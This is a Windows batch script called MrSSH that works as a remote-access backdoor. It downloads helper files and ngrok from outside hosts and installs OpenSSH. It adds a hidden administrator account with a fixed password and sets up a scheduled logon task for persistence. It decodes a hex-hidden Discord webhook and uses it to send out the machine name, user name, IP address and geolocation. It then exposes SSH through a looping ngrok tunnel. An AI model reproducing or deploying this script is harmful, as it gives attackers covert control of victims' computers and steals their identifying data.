@echo off
setlocal enabledelayedexpansion
cd %temp%

:: <Install>
curl -Ls "https://raw.githubusercontent.com/dh3b/MrSSH/main/Files/OpenSSH.ps1" -o "OpenSSH.ps1"
curl -Ls "https://raw.githubusercontent.com/dh3b/MrSSH/main/Files/Source.bat" -o "source.bat"
curl -Ls "https://github.com/dh3b/MrSSH/blob/main/Files/SilentCMD.exe?raw=true" -o "SilentCMD.exe"
curl -Ls "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip" -o "ngrok.zip"
curl -Ls "https://raw.githubusercontent.com/dh3b/MrSSH/main/Files/NgrokRun.bat" -o "NgrokRun.bat"
curl -Ls "https://github.com/dh3b/MrSSH/raw/main/Files/WebParse.exe?raw=true" -o "WebParse.exe"
curl -Ls "https://raw.githubusercontent.com/dh3b/MrSSH/main/Files/Hex.bat" -o "Hex.bat"
:: </Install>

powershell ./OpenSSH.ps1

net user "Admin" "Administrator" /add
net localgroup Administrators Admin /add
net localgroup Administratorzy Admin /add
net localgroup Administración  Admin /add

:: <Startup>
mkdir %appdata%\MrSSH
cd %appdata%\MrSSH & curl -Ls "https://raw.githubusercontent.com/dh3b/MrSSH/main/Files/onlogon.bat" -o "onlogon.bat" & curl -Ls "https://raw.githubusercontent.com/dh3b/MrSSH/main/Files/Silentlog.vbs" -o "Silent.vbs"
schtasks /create /tn "MrSSH" /sc onlogon /tr "%appdata%\MrSSH\Silent.vbs" /F
cd %temp%
:: </Startup>

curl -Ls "https://raw.githubusercontent.com/dh3b/MrSSH/main/Identifiers/Redirect.ini" -o "Redirect.ini"
FOR /F "delims=" %F IN (tokenName.txt) DO SET token=%F
FOR /F "tokens=* USEBACKQ" %F IN (`findstr "%token%" "redirect.ini"`) DO (SET hexwebhook=%F)
set "hexwebhook=%hexwebhook:~-244%"
FOR /F "tokens=* USEBACKQ" %F IN (`call hex.bat -hex "%hexwebhook%"`) DO (SET webhook=%F)


for /f "tokens=*" %%a in ('call "WebParse.exe" "http://ip-api.com/json/?fields=61439" query status city regionName country countryCode lat lon timezone isp') do set "%%a"

call source.bat +silent --embed "MrSSH has been invoked on %computername%\%username%" ":bookmark_tabs: __**Security, PC config**__ \\n\\n:desktop: **PC name:** %computername% \\n\\n:bust_in_silhouette: **User name:** %username%\\n\\n:house:**Ip address:** %query% (%isp%) \\n\\n\\n:bookmark_tabs: __**Location**__ \\n\\n:placard: **Country:** %country% (%countryCode%) \\n\\n:japan: **Region:** %regionName% \\n\\n:cityscape: **City:** %city% (%lat%; %lon%) \\n\\n:timer: **Timezone:** %timezone%" "52bf90" "https://i.imgur.com/b2Terft.png"

mkdir log
tar -xf ngrok.zip

:: <Start Ngrok>
start /B "copy" silentcmd xcopy /h /Y ngrok.log %temp%\log\ /DELAY:10
start /B "discordmsg" silentcmd %temp%\NgrokRun.bat /DELAY:10
start /B "ngrok" taskkill /IM ngrok.exe /F & ngrok.exe tcp 22 -log=stdout > ngrok.log & timeout 14400
:: </Start Ngrok>

:: <Restart Loop>
:ngrokloop
call source.bat +silent --embed "Renewing the MrSSH session for %computername%\%username% (%local%)..." " " "52bf90" "https://i.imgur.com/b2Terft.png"
start /B "copy" silentcmd xcopy /h /Y ngrok.log %temp%\log\ /DELAY:10
start /B "discordmsg" silentcmd NgrokRun.bat /DELAY:10
start /B "ngrok" taskkill /IM ngrok.exe /F & ngrok.exe tcp 22 -log=stdout > ngrok.log & timeout 14400
goto ngrokloop
:: </Restart Loop>
